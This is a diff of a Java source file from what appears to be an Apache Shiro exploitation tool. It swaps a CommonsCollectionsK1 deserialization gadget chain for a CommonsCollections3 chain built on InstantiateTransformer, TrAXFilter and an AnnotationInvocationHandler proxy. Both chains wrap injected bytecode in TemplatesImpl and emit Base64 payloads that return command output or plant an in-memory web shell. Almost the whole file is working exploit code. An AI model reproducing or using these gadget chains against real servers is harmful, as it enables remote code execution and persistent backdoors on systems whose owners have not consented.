@@ -2,29 +2,32 @@ package com.y5neko.shiroexp.gadget;
 
 import com.y5neko.shiroexp.echo.*;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.y5neko.shiroexp.misc.Tools;
 import javassist.*;
 import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.functors.InstantiateTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
+import javax.xml.transform.Templates;
 import java.io.ByteArrayOutputStream;
-import java.io.IOException;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
 /**
- * CommonsCollectionsK1 利用链
- * 使用 TiedMapEntry + LazyMap + InvokerTransformer 组合
+ * CommonsCollections3 利用链
+ * 使用 InstantiateTransformer + TrAXFilter + 动态代理组合
  */
-public class CommonsCollectionsK1 {
+public class CommonsCollections3 {
 
     /**
      * 反射设置字段值
@@ -36,10 +39,61 @@ public class CommonsCollectionsK1 {
     }
 
     /**
-     * 生成回显payload
+     * 构造 CC3 链 payload
+     * @param templatesImpl TemplatesImpl 对象
+     * @return 反序列化 payload
+     */
+    private Object getObject(TemplatesImpl templatesImpl) throws Exception {
+        // 创建初始的 dummy ChainedTransformer（避免序列化时触发）
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+                new ConstantTransformer(1)
+        });
+
+        // 创建真实的 transformer 链（通过 InstantiateTransformer 实例化 TrAXFilter）
+        Transformer[] transformers = new Transformer[]{
+                // 1. 返回 TrAXFilter.class
+                new ConstantTransformer(TrAXFilter.class),
+                // 2. 实例化 TrAXFilter，其构造函数会调用 templatesImpl.newTransformer()
+                new InstantiateTransformer(
+                        new Class[]{Templates.class},
+                        new Object[]{templatesImpl}
+                )
+        };
+
+        // 创建 LazyMap
+        Map<Object, Object> innerMap = new HashMap<>();
+        Map lazyMap = LazyMap.decorate(innerMap, (Transformer) chainedTransformer);
+
+        // 创建动态代理
+        Map mapProxy = (Map) Proxy.newProxyInstance(
+                CommonsCollections3.class.getClassLoader(),
+                new Class[]{Map.class},
+                createMemoizedInvocationHandler(lazyMap)
+        );
+
+        // 通过反射修改 chainedTransformer 的 iTransformers 为真实的 transformer 数组
+        setFieldValue(chainedTransformer, "iTransformers", transformers);
+
+        // 返回 AnnotationInvocationHandler 对象
+        return createMemoizedInvocationHandler(mapProxy);
+    }
+
+    /**
+     * 创建 MemoizedInvocationHandler
+     * 使用 sun.reflect.annotation.AnnotationInvocationHandler
+     */
+    private static InvocationHandler createMemoizedInvocationHandler(Map mapProxy) throws Exception {
+        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        return (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
+    }
+
+    /**
+     * 生成回显 payload
      * @param echoType 回显类型
      * @param key 密钥
-     * @return 加密后的payload字符串
+     * @return 加密后的 payload 字符串
      */
     public static String genEchoPayload(String echoType, String key) throws Exception {
         ClassPool pool = ClassPool.getDefault();
@@ -77,36 +131,18 @@ public class CommonsCollectionsK1 {
         ctClass.setSuperclass(superClass);
 
         // 创建 TemplatesImpl 对象
-        TemplatesImpl templates = new TemplatesImpl();
-        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
-        setFieldValue(templates, "_name", "a");
-        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+        TemplatesImpl templatesImpl = new TemplatesImpl();
+        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{ctClass.toBytecode()});
+        setFieldValue(templatesImpl, "_name", "a");
+        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
 
-        // CCK1 利用链核心
-        // 1. 创建初始 InvokerTransformer (方法名为 toString，后续会反射修改为 newTransformer)
-        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-
-        // 2. 创建 LazyMap，绑定 InvokerTransformer
-        HashMap<String, String> innerMap = new HashMap<>();
-        Map lazyMap = LazyMap.decorate(innerMap, (Transformer) transformer);
-
-        // 3. 创建 TiedMapEntry，绑定 LazyMap 和 TemplatesImpl
-        TiedMapEntry tied = new TiedMapEntry(lazyMap, templates);
-
-        // 4. 创建 outer HashMap，将 TiedMapEntry 作为 key 放入
-        Map<Object, Object> outerMap = new HashMap<>();
-        outerMap.put(tied, "t");
-
-        // 5. 清空 innerMap（关键步骤，确保反序列化时触发）
-        innerMap.clear();
-
-        // 6. 反射修改 InvokerTransformer 的方法名为 newTransformer
-        setFieldValue(transformer, "iMethodName", "newTransformer");
+        // 生成反序列化 payload
+        Object payload = new CommonsCollections3().getObject(templatesImpl);
 
         // 序列化
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baos);
-        oos.writeObject(outerMap);
+        oos.writeObject(payload);
         oos.close();
 
         String data = Base64.getEncoder().encodeToString(baos.toByteArray());
@@ -114,9 +150,9 @@ public class CommonsCollectionsK1 {
     }
 
     /**
-     * 生成内存马payload
+     * 生成内存马 payload
      * @param key 密钥
-     * @return 加密后的payload字符串
+     * @return 加密后的 payload 字符串
      */
     public static String genMemPayload(String key) throws Exception {
         ClassPool pool = ClassPool.getDefault();
@@ -136,30 +172,18 @@ public class CommonsCollectionsK1 {
         ctClass.setSuperclass(superClass);
 
         // 创建 TemplatesImpl 对象
-        TemplatesImpl templates = new TemplatesImpl();
-        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
-        setFieldValue(templates, "_name", "a");
-        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+        TemplatesImpl templatesImpl = new TemplatesImpl();
+        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{ctClass.toBytecode()});
+        setFieldValue(templatesImpl, "_name", "a");
+        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
 
-        // CCK1 利用链核心
-        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-
-        HashMap<String, String> innerMap = new HashMap<>();
-        Map lazyMap = LazyMap.decorate(innerMap, (Transformer) transformer);
-
-        TiedMapEntry tied = new TiedMapEntry(lazyMap, templates);
-
-        Map<Object, Object> outerMap = new HashMap<>();
-        outerMap.put(tied, "t");
-
-        innerMap.clear();
-
-        setFieldValue(transformer, "iMethodName", "newTransformer");
+        // 生成反序列化 payload
+        Object payload = new CommonsCollections3().getObject(templatesImpl);
 
         // 序列化
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baos);
-        oos.writeObject(outerMap);
+        oos.writeObject(payload);
         oos.close();
 
         String data = Base64.getEncoder().encodeToString(baos.toByteArray());
